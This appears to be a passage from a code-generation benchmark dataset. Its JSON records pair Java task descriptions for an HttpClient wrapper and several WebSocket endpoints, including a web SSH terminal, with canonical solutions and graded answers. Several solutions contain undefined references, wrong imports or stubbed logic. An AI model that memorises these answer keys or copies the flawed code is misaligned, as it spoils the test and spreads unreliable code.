    "Instruction": "Task Description: Create a Java class that implements HTTP client functionality using Java's HttpClient for synchronous and asynchronous HTTP operations including GET, PUT, HEAD, and DELETE requests.\n\nClass Description: The BlobHttpClient class provides a wrapper around Java's HttpClient to perform common HTTP operations. It handles client initialization, request construction, and response processing with both synchronous and asynchronous options.\n\nAttributes:\nhttpClient: [HttpClient] - The underlying HTTP client instance used for all requests\n\nMethods:\nsetup(): [void] - Initializes the HttpClient instance with default configuration (follows normal redirects)\ncloseClient(): [void] - Closes the HttpClient instance and releases resources\nput: [HttpResponse<String>]([URI uri, String body]) -> [HttpResponse<String>] - Sends a synchronous PUT request with the provided body to the specified URI and returns the string response\nget: [HttpResponse<String>]([URI uri]) -> [HttpResponse<String>] - Sends a synchronous GET request to the specified URI and returns the string response\ngetAsync: [CompletableFuture<HttpResponse<String>>]([URI uri]) -> [CompletableFuture<HttpResponse<String>>] - Sends an asynchronous GET request to the specified URI and returns a CompletableFuture of the response\nhead: [HttpResponse<Void>]([URI uri]) -> [HttpResponse<Void>] - Sends a synchronous HEAD request to the specified URI and returns a response without body\ndelete: [HttpResponse<Void>]([URI uri]) -> [HttpResponse<Void>] - Sends a synchronous DELETE request to the specified URI and returns a response without body",
    "Canonical_solution": "import java.net.URI;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpClient.Redirect;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpRequest.BodyPublishers;\nimport java.net.http.HttpResponse;\nimport java.net.http.HttpResponse.BodyHandlers;\nimport java.util.concurrent.CompletableFuture;\nimport java.util.concurrent.ExecutionException;\n\npublic class BlobHttpClient {\n\n    protected HttpClient httpClient;\n\n    public void setup() throws ExecutionException, InterruptedException {\n        httpClient = HttpClient.newBuilder()\n            .followRedirects(Redirect.NORMAL)\n            .build();\n    }\n\n    public void closeClient() throws Exception {\n        httpClient.close();\n    }\n\n    protected HttpResponse<String> put(URI uri, String body) throws Exception {\n        HttpRequest request = HttpRequest.newBuilder(uri)\n            .PUT(BodyPublishers.ofString(body))\n            .build();\n        HttpResponse<String> response = httpClient.send(request, BodyHandlers.ofString());\n        return response;\n    }\n\n    protected HttpResponse<String> get(URI uri) throws Exception {\n        HttpRequest request = HttpRequest.newBuilder(uri)\n            .build();\n        return httpClient.send(request, BodyHandlers.ofString());\n    }\n\n    protected CompletableFuture<HttpResponse<String>> getAsync(URI uri) {\n        HttpRequest request = HttpRequest.newBuilder(uri)\n            .build();\n        return httpClient.sendAsync(request, BodyHandlers.ofString());\n    }\n\n    protected HttpResponse<Void> head(URI uri) throws Exception {\n        HttpRequest request = HttpRequest.newBuilder(uri).HEAD().build();\n        return httpClient.send(request, BodyHandlers.discarding());\n    }\n\n    protected HttpResponse<Void> delete(URI uri) throws Exception {\n        HttpRequest request = HttpRequest.newBuilder(uri).DELETE().build();\n        return httpClient.send(request, BodyHandlers.discarding());\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 17,
    "right_result": "```java\nimport java.net.URI;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpResponse;\nimport java.time.Duration;\nimport java.util.concurrent.CompletableFuture;\n\npublic class BlobHttpClient {\n    private HttpClient httpClient;\n\n    public void setup() {\n        httpClient = HttpClient.newBuilder()\n                .followRedirects(HttpClient.Redirect.NORMAL)\n                .connectTimeout(Duration.ofSeconds(10))\n                .build();\n    }\n\n    public void closeClient() {\n        if (httpClient != null) {\n            httpClient = null;\n        }\n    }\n\n    public HttpResponse<String> put(URI uri, String body) throws Exception {\n        HttpRequest request = HttpRequest.newBuilder(uri)\n                .PUT(HttpRequest.BodyPublishers.ofString(body))\n                .build();\n        return httpClient.send(request, HttpResponse.BodyHandlers.ofString());\n    }\n\n    public HttpResponse<String> get(URI uri) throws Exception {\n        HttpRequest request = HttpRequest.newBuilder(uri)\n                .GET()\n                .build();\n        return httpClient.send(request, HttpResponse.BodyHandlers.ofString());\n    }\n\n    public CompletableFuture<HttpResponse<String>> getAsync(URI uri) {\n        HttpRequest request = HttpRequest.newBuilder(uri)\n                .GET()\n                .build();\n        return httpClient.sendAsync(request, HttpResponse.BodyHandlers.ofString());\n    }\n\n    public HttpResponse<Void> head(URI uri) throws Exception {\n        HttpRequest request = HttpRequest.newBuilder(uri)\n                .method(\"HEAD\", HttpRequest.BodyPublishers.noBody())\n                .build();\n        return httpClient.send(request, HttpResponse.BodyHandlers.discarding());\n    }\n\n    public HttpResponse<Void> delete(URI uri) throws Exception {\n        HttpRequest request = HttpRequest.newBuilder(uri)\n                .DELETE()\n                .build();\n        return httpClient.send(request, HttpResponse.BodyHandlers.discarding());\n    }\n}\n```"
  },
  {
    "Task_id": 480,
    "Instruction": "Task Description: Create a WebSocket server implementation using the org.java_websocket library to handle client connections, messages, and disconnections.\n\nClass Description: MyWebSocketServer is a custom WebSocket server implementation that extends the WebSocketServer class from the org.java_websocket library. It provides lifecycle methods for managing WebSocket connections and handling communication events.\n\nAttributes:\n- address: InetSocketAddress - The network address and port on which the server listens for connections\n\nMethods:\n- Constructor: MyWebSocketServer(InetSocketAddress address) -> void - Initializes the WebSocket server with the specified address\n- onOpen: onOpen(WebSocket conn, ClientHandshake handshake) -> void - Called when a new WebSocket connection is established\n- onClose: onClose(WebSocket conn, int code, String reason, boolean remote) -> void - Called when a WebSocket connection is closed\n- onMessage: onMessage(WebSocket conn, String message) -> void - Called when a message is received from a WebSocket client\n- onError: onError(WebSocket conn, Exception ex) -> void - Called when an error occurs with a WebSocket connection\n- onStart: onStart() -> void - Called when the server starts successfully",
    "Canonical_solution": "import java.net.InetSocketAddress;\nimport org.java_websocket.WebSocket;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.server.WebSocketServer;\n\npublic class MyWebSocketServer extends WebSocketServer {\n\n    public MyWebSocketServer(InetSocketAddress address) {\n        super(address);\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n        // Handle new WebSocket connection\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n        // Handle WebSocket connection closing\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n        // Handle incoming WebSocket message\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        // Handle WebSocket errors\n        ex.printStackTrace();\n    }\n\n    @Override\n    public void onStart() {\n        // Handle server startup\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 28,
    "right_result": "```java\nimport org.java_websocket.WebSocket;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.server.WebSocketServer;\n\nimport java.net.InetSocketAddress;\nimport java.util.logging.Logger;\n\npublic class MyWebSocketServer extends WebSocketServer {\n\n    private static final Logger logger = Logger.getLogger(MyWebSocketServer.class.getName());\n\n    public MyWebSocketServer(InetSocketAddress address) {\n        super(address);\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n        logger.info(\"New connection from \" + conn.getRemoteSocketAddress());\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n        logger.info(\"Connection closed: \" + conn.getRemoteSocketAddress() + \", Code: \" + code + \", Reason: \" + reason);\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n        logger.info(\"Received message from \" + conn.getRemoteSocketAddress() + \": \" + message);\n        conn.send(\"Echo: \" + message);\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        logger.severe(\"Error occurred: \" + ex.getMessage());\n        if (conn != null) {\n            conn.close();\n        }\n    }\n\n    @Override\n    public void onStart() {\n        logger.info(\"WebSocket server started successfully.\");\n    }\n}\n```"
  },
  {
    "Task_id": 481,
    "Instruction": "Task Description: Implement a WebSocket server endpoint in Java that handles real-time client communication, including connection management, message processing, and error handling.\n\nClass Description: WebSocketServer is a Java EE WebSocket endpoint that manages client connections through WebSocket protocol. It handles connection events (open/close/error) and processes incoming messages, supporting different message operations like sending messages, reading status, and retrieving history.\n\nAttributes:\n- sessionPools: [ConcurrentHashMap<String, Session>] - Thread-safe map storing active client sessions with their IDs as keys\n\nMethods:\n- onOpen: [onOpen(String accessToken, Session session)] -> [void] - Handles new WebSocket connections, authenticates users, and manages session conflicts\n- onClose: [onClose(String accessToken)] -> [void] - Cleans up closed connections from session pool\n- onMessage: [onMessage(String accessToken, String msg)] -> [void] - Processes incoming JSON messages and delegates to appropriate operations\n- operation: [operation(String accessToken, MessageOperation messageOperation)] -> [void] - Executes different message operations based on operation type\n- sendMessage: [sendMessage(String sessionId, MessageVO message)] -> [void] - Sends message to specific client session by ID\n- sendMessage: [sendMessage(Session session, MessageVO message)] -> [void] - Sends message to given session object\n- onError: [onError(Session session, Throwable throwable)] -> [void] - Handles WebSocket communication errors",
    "Canonical_solution": "import cn.hutool.json.JSONUtil;\nimport cn.lili.common.security.AuthUser;\nimport cn.lili.common.security.context.UserContext;\nimport cn.lili.common.security.enums.UserEnums;\nimport cn.lili.modules.im.config.CustomSpringConfigurator;\nimport cn.lili.modules.im.entity.vo.MessageVO;\nimport cn.lili.modules.im.entity.enums.MessageResultType;\nimport cn.lili.modules.im.entity.vo.MessageOperation;\nimport com.alibaba.fastjson.JSON;\nimport javax.websocket.OnClose;\nimport javax.websocket.OnError;\nimport javax.websocket.OnMessage;\nimport javax.websocket.OnOpen;\nimport javax.websocket.Session;\nimport javax.websocket.server.PathParam;\nimport javax.websocket.server.ServerEndpoint;\nimport java.util.concurrent.ConcurrentHashMap;\n\n@Component\n@ServerEndpoint(value = \"/lili/webSocket/{accessToken}\", configurator = CustomSpringConfigurator.class)\n@Scope(\"prototype\")\npublic class WebSocketServer {\n\n    private static ConcurrentHashMap<String, Session> sessionPools = new ConcurrentHashMap<>();\n\n    @OnOpen\n    public void onOpen(@PathParam(\"accessToken\") String accessToken, Session session) {\n        AuthUser authUser = UserContext.getAuthUser(cache, accessToken);\n        String sessionId = UserEnums.STORE.equals(authUser.getRole()) ? authUser.getStoreId() : authUser.getId();\n        if (sessionPools.containsKey(sessionId)) {\n            Session oldSession = sessionPools.get(sessionId);\n            sendMessage(oldSession,\n                MessageVO.builder().messageResultType(MessageResultType.OFFLINE).result(\"\u7528\u6237\u5f02\u5730\u767b\u9646\").build());\n            try {\n                oldSession.close();\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }\n        sessionPools.put(sessionId, session);\n    }\n\n    @OnClose\n    public void onClose(@PathParam(\"accessToken\") String accessToken) {\n        AuthUser authUser = UserContext.getAuthUser(accessToken);\n        sessionPools.remove(authUser);\n    }\n\n    @OnMessage\n    public void onMessage(@PathParam(\"accessToken\") String accessToken, String msg) {\n        MessageOperation messageOperation = JSON.parseObject(msg, MessageOperation.class);\n        operation(accessToken, messageOperation);\n    }\n\n    private void operation(String accessToken, MessageOperation messageOperation) {\n        AuthUser authUser = UserContext.getAuthUser(accessToken);\n        switch (messageOperation.getOperationType()) {\n            case MESSAGE:\n                sendMessage(messageOperation.getTo(), new MessageVO(MessageResultType.MESSAGE, imMessage));\n                break;\n            case READ:\n                break;\n            case UNREAD:\n                sendMessage(authUser.getId(),\n                    new MessageVO(MessageResultType.UN_READ, imMessageService.unReadMessages(accessToken)));\n                break;\n            case HISTORY:\n                sendMessage(authUser.getId(), new MessageVO(MessageResultType.HISTORY,\n                    imMessageService.historyMessage(accessToken, messageOperation.getTo())));\n                break;\n            default:\n                break;\n        }\n    }\n\n    private void sendMessage(String sessionId, MessageVO message) {\n        Session session = sessionPools.get(sessionId);\n        sendMessage(session, message);\n    }\n\n    private void sendMessage(Session session, MessageVO message) {\n        if (session != null) {\n            try {\n                session.getBasicRemote().sendText(JSON.toJSONString(message, true));\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    @OnError\n    public void onError(Session session, Throwable throwable) {\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 26,
    "right_result": "```java\nimport javax.websocket.*;\nimport javax.websocket.server.ServerEndpoint;\nimport java.io.IOException;\nimport java.util.concurrent.ConcurrentHashMap;\n\n@ServerEndpoint(value = \"/websocket\", configurator = HttpSessionConfigurator.class)\npublic class WebSocketServer {\n\n    private static ConcurrentHashMap<String, Session> sessionPools = new ConcurrentHashMap<>();\n\n    @OnOpen\n    public void onOpen(Session session, EndpointConfig config) {\n        String accessToken = (String) config.getUserProperties().get(\"accessToken\");\n        if (sessionPools.containsKey(accessToken)) {\n            try {\n                sessionPools.get(accessToken).close(new CloseReason(CloseReason.CloseCodes.CANNOT_ACCEPT, \"Session already exists\"));\n            } catch (IOException e) {\n                onError(session, e);\n            }\n        }\n        sessionPools.put(accessToken, session);\n    }\n\n    @OnClose\n    public void onClose(Session session) {\n        sessionPools.values().removeIf(s -> s.equals(session));\n    }\n\n    @OnMessage\n    public void onMessage(Session session, String message) {\n        String accessToken = (String) session.getUserProperties().get(\"accessToken\");\n        MessageOperation messageOperation = parseMessage(message);\n        operation(accessToken, messageOperation);\n    }\n\n    @OnError\n    public void onError(Session session, Throwable throwable) {\n        throwable.printStackTrace();\n    }\n\n    private MessageOperation parseMessage(String json) {\n        // Implement JSON parsing logic here to extract operation type and payload\n        return null;\n    }\n\n    private void operation(String accessToken, MessageOperation messageOperation) {\n        if (messageOperation == null) {\n            return;\n        }\n        switch (messageOperation.getType()) {\n            case \"send\":\n                sendMessage(accessToken, (MessageVO) messageOperation.getPayload());\n                break;\n            case \"readStatus\":\n                // Handle read status logic\n                break;\n            case \"history\":\n                // Handle history retrieval logic\n                break;\n            default:\n                break;\n        }\n    }\n\n    private void sendMessage(String sessionId, MessageVO message) {\n        Session session = sessionPools.get(sessionId);\n        if (session != null && session.isOpen()) {\n            sendMessage(session, message);\n        }\n    }\n\n    private void sendMessage(Session session, MessageVO message) {\n        try {\n            session.getBasicRemote().sendText(message.toString());\n        } catch (IOException e) {\n            onError(session, e);\n        }\n    }\n\n    private static class MessageOperation {\n        private String type;\n        private Object payload;\n\n        public String getType() {\n            return type;\n        }\n\n        public Object getPayload() {\n            return payload;\n        }\n    }\n\n    private static class MessageVO {\n        @Override\n        public String toString() {\n            return \"{}\"; // Replace with actual serialization\n        }\n    }\n\n    private static class HttpSessionConfigurator extends ServerEndpointConfig.Configurator {\n        @Override\n        public void modifyHandshake(ServerEndpointConfig sec, HandshakeRequest request, HandshakeResponse response) {\n            sec.getUserProperties().put(\"accessToken\", request.getParameterMap().get(\"token\").get(0));\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 482,
    "Instruction": "Task Description: Implement a WebSocket server endpoint class in Java that handles client connections, messages, disconnections, and errors using Java EE WebSocket API.\n\nClass Description: The WebsocketServerEndpoint class is a WebSocket server endpoint that manages client connections and message handling. It uses annotations to define WebSocket lifecycle events and maintains a map of message handlers for different message types.\n\nAttributes:\n- logger: Logger - Used for logging server events and errors\n- HANDLERS: Map<String, MessageHandler> - Static map storing message handlers keyed by message type\n\nMethods:\n- onOpen(Session session, EndpointConfig config) -> void - Handles new client connections, authenticates using access token from request parameters\n- onMessage(Session session, String message) -> void - Processes incoming messages from clients, delegates to appropriate message handler\n- onClose(Session session, CloseReason closeReason) -> void - Handles client disconnections, cleans up session\n- onError(Session session, Throwable throwable) -> void - Handles WebSocket communication errors\n- getMessageClass(MessageHandler handler) -> Class<? extends Message> - Helper method to determine message class type from handler's generic type information",
    "Canonical_solution": "import cn.iocoder.springboot.lab25.springwebsocket.handler.MessageHandler;\nimport cn.iocoder.springboot.lab25.springwebsocket.message.AuthRequest;\nimport cn.iocoder.springboot.lab25.springwebsocket.message.Message;\nimport cn.iocoder.springboot.lab25.springwebsocket.util.WebSocketUtil;\nimport com.alibaba.fastjson.JSON;\nimport com.alibaba.fastjson.JSONObject;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport org.springframework.aop.framework.AopProxyUtils;\n\nimport javax.websocket.*;\nimport javax.websocket.server.ServerEndpoint;\nimport java.lang.reflect.ParameterizedType;\nimport java.lang.reflect.Type;\nimport java.util.HashMap;\nimport java.util.List;\nimport java.util.Map;\nimport java.util.Objects;\n\n@ServerEndpoint(\"/\")\npublic class WebsocketServerEndpoint {\n\n    private Logger logger = LoggerFactory.getLogger(getClass());\n\n    private static final Map<String, MessageHandler> HANDLERS = new HashMap<>();\n\n    @OnOpen\n    public void onOpen(Session session, EndpointConfig config) {\n        logger.info(\"[onOpen][session({}) connected]\", session);\n        List<String> accessTokenValues = session.getRequestParameterMap().get(\"accessToken\");\n        String accessToken = !CollectionUtils.isEmpty(accessTokenValues) ? accessTokenValues.get(0) : null;\n        AuthRequest authRequest = new AuthRequest().setAccessToken(accessToken);\n        MessageHandler<AuthRequest> messageHandler = HANDLERS.get(AuthRequest.TYPE);\n        if (messageHandler == null) {\n            logger.error(\"[onOpen][Auth message type, no message handler found]\");\n            return;\n        }\n        messageHandler.execute(session, authRequest);\n    }\n\n    @OnMessage\n    public void onMessage(Session session, String message) {\n        logger.info(\"[onMessage][session({}) received message({})]\", session, message);\n        try {\n            JSONObject jsonMessage = JSON.parseObject(message);\n            String messageType = jsonMessage.getString(\"type\");\n            MessageHandler messageHandler = HANDLERS.get(messageType);\n            if (messageHandler == null) {\n                logger.error(\"[onMessage][Message type({}) has no handler]\", messageType);\n                return;\n            }\n            Class<? extends Message> messageClass = getMessageClass(messageHandler);\n            Message messageObj = JSON.parseObject(jsonMessage.getString(\"body\"), messageClass);\n            messageHandler.execute(session, messageObj);\n        } catch (Throwable throwable) {\n            logger.error(\"[onMessage][session({}) error processing message]\", session, throwable);\n        }\n    }\n\n    @OnClose\n    public void onClose(Session session, CloseReason closeReason) {\n        logger.info(\"[onClose][session({}) disconnected. Reason: {}]\", session, closeReason);\n        WebSocketUtil.removeSession(session);\n    }\n\n    @OnError\n    public void onError(Session session, Throwable throwable) {\n        logger.error(\"[onError][session({}) error occurred]\", session, throwable);\n    }\n\n    private Class<? extends Message> getMessageClass(MessageHandler handler) {\n        Class<?> targetClass = AopProxyUtils.ultimateTargetClass(handler);\n        Type[] interfaces = targetClass.getGenericInterfaces();\n        Class<?> superclass = targetClass.getSuperclass();\n        while ((Objects.isNull(interfaces) || interfaces.length == 0) && Objects.nonNull(superclass)) {\n            interfaces = superclass.getGenericInterfaces();\n            superclass = targetClass.getSuperclass();\n        }\n        if (Objects.nonNull(interfaces)) {\n            for (Type type : interfaces) {\n                if (type instanceof ParameterizedType) {\n                    ParameterizedType parameterizedType = (ParameterizedType) type;\n                    if (Objects.equals(parameterizedType.getRawType(), MessageHandler.class)) {\n                        Type[] actualTypeArguments = parameterizedType.getActualTypeArguments();\n                        if (Objects.nonNull(actualTypeArguments) && actualTypeArguments.length > 0) {\n                            return (Class<Message>) actualTypeArguments[0];\n                        }\n                    }\n                }\n            }\n        }\n        throw new IllegalStateException(String.format(\"Cannot determine message type for handler %s\", handler));\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 26,
    "right_result": "```java\nimport javax.websocket.*;\nimport javax.websocket.server.ServerEndpoint;\nimport javax.websocket.server.ServerEndpointConfig;\nimport java.io.IOException;\nimport java.lang.reflect.ParameterizedType;\nimport java.lang.reflect.Type;\nimport java.util.Map;\nimport java.util.concurrent.ConcurrentHashMap;\nimport java.util.logging.Logger;\n\n@ServerEndpoint(value = \"/websocket\", configurator = WebSocketServerEndpoint.ConfiguratorImpl.class)\npublic class WebSocketServerEndpoint {\n\n    private static final Logger logger = Logger.getLogger(WebSocketServerEndpoint.class.getName());\n\n    private static final Map<String, MessageHandler> HANDLERS = new ConcurrentHashMap<>();\n\n    @OnOpen\n    public void onOpen(Session session, EndpointConfig config) {\n        String accessToken = (String) config.getUserProperties().get(\"access_token\");\n        if (accessToken == null || !authenticate(accessToken)) {\n            try {\n                session.close(new CloseReason(CloseReason.CloseCodes.VIOLATED_POLICY, \"Authentication failed\"));\n            } catch (IOException e) {\n                logger.severe(\"Failed to close unauthorized session: \" + e.getMessage());\n            }\n            return;\n        }\n        logger.info(\"Client connected: \" + session.getId());\n    }\n\n    @OnMessage\n    public void onMessage(Session session, String message) {\n        logger.info(\"Received message from client: \" + message);\n        for (Map.Entry<String, MessageHandler> entry : HANDLERS.entrySet()) {\n            if (entry.getKey().equals(message)) {\n                entry.getValue().handle(session, message);\n                break;\n            }\n        }\n    }\n\n    @OnClose\n    public void onClose(Session session, CloseReason closeReason) {\n        logger.info(\"Client disconnected: \" + session.getId() + \", Reason: \" + closeReason.getReasonPhrase());\n    }\n\n    @OnError\n    public void onError(Session session, Throwable throwable) {\n        logger.severe(\"Error occurred in WebSocket session: \" + session.getId() + \", Error: \" + throwable.getMessage());\n    }\n\n    public Class<? extends Message> getMessageClass(MessageHandler handler) {\n        Type type = handler.getClass().getGenericInterfaces()[0];\n        if (type instanceof ParameterizedType) {\n            Type[] typeArguments = ((ParameterizedType) type).getActualTypeArguments();\n            if (typeArguments.length > 0 && typeArguments[0] instanceof Class) {\n                return (Class<? extends Message>) typeArguments[0];\n            }\n        }\n        throw new IllegalArgumentException(\"MessageHandler does not specify a valid message class.\");\n    }\n\n    public static void registerHandler(String messageType, MessageHandler handler) {\n        HANDLERS.put(messageType, handler);\n    }\n\n    private boolean authenticate(String token) {\n        // Implement your authentication logic here\n        return \"valid_token\".equals(token);\n    }\n\n    public static class ConfiguratorImpl extends ServerEndpointConfig.Configurator {\n        @Override\n        public void modifyHandshake(ServerEndpointConfig sec, HandshakeRequest request, HandshakeResponse response) {\n            String accessToken = request.getParameterMap().get(\"access_token\").toString();\n            sec.getUserProperties().put(\"access_token\", accessToken);\n        }\n    }\n\n    public interface MessageHandler {\n        void handle(Session session, String message);\n    }\n\n    public interface Message {\n    }\n}\n```"
  },
  {
    "Task_id": 483,
    "Instruction": "Task Description: Implement a WebSocket server endpoint for secure shell terminal communication, handling client connections, message exchange, and session management.\n\nClass Description: SecureShellWS is a Java EE WebSocket endpoint that facilitates secure shell terminal interactions between clients and servers. It manages terminal sessions, processes keyboard input commands, and handles connection lifecycle events.\n\nAttributes:\n- log: [Logger] - Logger instance for error and debug logging\n- keyMap: [Map<Integer, byte[]>] - Static mapping of key codes to their corresponding byte sequences for terminal control\n- httpSession: [HttpSession] - HTTP session associated with the WebSocket connection\n- session: [Session] - WebSocket session object for the current connection\n- sessionId: [Long] - Unique identifier for the terminal session\n\nMethods:\n- onOpen: [onOpen](Session session, EndpointConfig config) -> void - Handles new WebSocket connections, initializes session parameters, and starts output thread\n- onMessage: [onMessage](String message) -> void - Processes incoming JSON messages containing terminal commands or key inputs\n- onError: [onError](Session session, Throwable t) -> void - Handles WebSocket communication errors\n- onClose: [onClose]() -> void - Cleans up resources when WebSocket connection is closed, terminating all associated terminal sessions",
    "Canonical_solution": "import com.google.gson.Gson;\nimport io.bastillion.common.util.AppConfig;\nimport io.bastillion.common.util.AuthUtil;\nimport io.bastillion.manage.control.SecureShellKtrl;\nimport io.bastillion.manage.db.UserDB;\nimport io.bastillion.manage.model.SchSession;\nimport io.bastillion.manage.model.UserSchSessions;\nimport io.bastillion.manage.task.SentOutputTask;\nimport org.apache.commons.lang3.StringUtils;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport javax.servlet.http.HttpSession;\nimport javax.websocket.*;\nimport javax.websocket.server.ServerEndpoint;\nimport java.io.IOException;\nimport java.security.GeneralSecurityException;\nimport java.sql.SQLException;\nimport java.util.ArrayList;\nimport java.util.HashMap;\nimport java.util.Map;\n\n@ServerEndpoint(value = \"/admin/terms.ws\", configurator = GetHttpSessionConfigurator.class)\npublic class SecureShellWS {\n\n    private static final Logger log = LoggerFactory.getLogger(SecureShellWS.class);\n    private static final Map<Integer, byte[]> keyMap = new HashMap<>();\n\n    static {\n        keyMap.put(27, new byte[]{(byte) 0x1b});\n        keyMap.put(13, new byte[]{(byte) 0x0d});\n        keyMap.put(37, new byte[]{(byte) 0x1b, (byte) 0x4f, (byte) 0x44});\n        keyMap.put(38, new byte[]{(byte) 0x1b, (byte) 0x4f, (byte) 0x41});\n        keyMap.put(39, new byte[]{(byte) 0x1b, (byte) 0x4f, (byte) 0x43});\n        keyMap.put(40, new byte[]{(byte) 0x1b, (byte) 0x4f, (byte) 0x42});\n        keyMap.put(8, new byte[]{(byte) 0x7f});\n        keyMap.put(9, new byte[]{(byte) 0x09});\n        keyMap.put(17, new byte[]{});\n        keyMap.put(46, \"\\033[3~\".getBytes());\n        keyMap.put(45, \"\\033[2~\".getBytes());\n        keyMap.put(33, \"\\033[5~\".getBytes());\n        keyMap.put(34, \"\\033[6~\".getBytes());\n        keyMap.put(35, \"\\033[4~\".getBytes());\n        keyMap.put(36, \"\\033[1~\".getBytes());\n    }\n\n    private HttpSession httpSession;\n    private Session session;\n    private Long sessionId;\n\n    @OnOpen\n    public void onOpen(Session session, EndpointConfig config) {\n        if (StringUtils.isNotEmpty(AppConfig.getProperty(\"websocketTimeout\"))) {\n            session.setMaxIdleTimeout(Long.parseLong(AppConfig.getProperty(\"websocketTimeout\")) * 60000);\n        } else {\n            session.setMaxIdleTimeout(0);\n        }\n\n        this.httpSession = (HttpSession) config.getUserProperties().get(HttpSession.class.getName());\n        try {\n            this.sessionId = AuthUtil.getSessionId(httpSession);\n            this.session = session;\n            new Thread(new SentOutputTask(sessionId, session, UserDB.getUser(AuthUtil.getUserId(httpSession)))).start();\n        } catch (GeneralSecurityException | SQLException ex) {\n            log.error(ex.toString(), ex);\n        }\n    }\n\n    @OnMessage\n    public void onMessage(String message) {\n        if (session.isOpen() && StringUtils.isNotEmpty(message) && !\"heartbeat\".equals(message)) {\n            try {\n                Map jsonRoot = new Gson().fromJson(message, Map.class);\n                String command = (String) jsonRoot.get(\"command\");\n                Integer keyCode = null;\n                Double keyCodeDbl = (Double) jsonRoot.get(\"keyCode\");\n                if (keyCodeDbl != null) {\n                    keyCode = keyCodeDbl.intValue();\n                }\n\n                for (String idStr : (ArrayList<String>) jsonRoot.get(\"id\")) {\n                    Integer id = Integer.parseInt(idStr);\n                    UserSchSessions userSchSessions = SecureShellKtrl.getUserSchSessionMap().get(sessionId);\n                    if (userSchSessions != null) {\n                        SchSession schSession = userSchSessions.getSchSessionMap().get(id);\n                        if (keyCode != null && keyMap.containsKey(keyCode)) {\n                            schSession.getCommander().write(keyMap.get(keyCode));\n                        } else {\n                            schSession.getCommander().print(command);\n                        }\n                    }\n                }\n                AuthUtil.setTimeout(httpSession);\n            } catch (IOException ex) {\n                log.error(ex.toString(), ex);\n            }\n        }\n    }\n\n    @OnError\n    public void onError(Session session, Throwable t) {\n        log.error(t.toString(), t);\n    }\n\n    @OnClose\n    public void onClose() {\n        UserSchSessions userSchSessions = SecureShellKtrl.getUserSchSessionMap().get(sessionId);\n        if (userSchSessions != null) {\n            Map<Integer, SchSession> schSessionMap = userSchSessions.getSchSessionMap();\n            for (Integer sessionKey : schSessionMap.keySet()) {\n                SchSession schSession = schSessionMap.get(sessionKey);\n                schSession.getChannel().disconnect();\n                schSession.getSession().disconnect();\n                schSessionMap.remove(sessionKey);\n            }\n            schSessionMap.clear();\n            SecureShellKtrl.getUserSchSessionMap().remove(sessionId);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 26,
    "right_result": "```java\nimport javax.websocket.*;\nimport javax.websocket.server.ServerEndpoint;\nimport javax.websocket.server.Session;\nimport javax.servlet.http.HttpSession;\nimport java.io.IOException;\nimport java.util.Map;\nimport java.util.concurrent.ConcurrentHashMap;\nimport java.util.logging.Logger;\n\n@ServerEndpoint(value = \"/secure-shell\", configurator = HttpSessionConfigurator.class)\npublic class SecureShellWS {\n\n    private static final Logger log = Logger.getLogger(SecureShellWS.class.getName());\n    private static final Map<Integer, byte[]> keyMap = new ConcurrentHashMap<>();\n    private HttpSession httpSession;\n    private Session session;\n    private Long sessionId;\n\n    @OnOpen\n    public void onOpen(Session session, EndpointConfig config) {\n        this.session = session;\n        this.httpSession = (HttpSession) config.getUserProperties().get(HttpSession.class.getName());\n        this.sessionId = System.currentTimeMillis();\n        log.info(\"WebSocket connection opened for session ID: \" + sessionId);\n        startOutputThread();\n    }\n\n    @OnMessage\n    public void onMessage(String message) {\n        try {\n            log.fine(\"Received message: \" + message);\n            // Process JSON message and execute command or handle key input\n            session.getBasicRemote().sendText(\"Command processed\");\n        } catch (IOException e) {\n            log.severe(\"Error sending response: \" + e.getMessage());\n        }\n    }\n\n    @OnError\n    public void onError(Session session, Throwable t) {\n        log.severe(\"WebSocket error: \" + t.getMessage());\n        t.printStackTrace();\n    }\n\n    @OnClose\n    public void onClose() {\n        log.info(\"WebSocket connection closed for session ID: \" + sessionId);\n        terminateTerminalSession();\n    }\n\n    private void startOutputThread() {\n        Thread outputThread = new Thread(() -> {\n            while (true) {\n                try {\n                    Thread.sleep(1000);\n                    if (session.isOpen()) {\n                        session.getBasicRemote().sendText(\"Heartbeat from server\");\n                    }\n                } catch (IOException | InterruptedException e) {\n                    log.severe(\"Output thread error: \" + e.getMessage());\n                    break;\n                }\n            }\n        });\n        outputThread.setDaemon(true);\n        outputThread.start();\n    }\n\n    private void terminateTerminalSession() {\n        // Terminate any active terminal session here\n        log.info(\"Terminal session terminated for session ID: \" + sessionId);\n    }\n}\n```"
  },
  {
    "Task_id": 484,
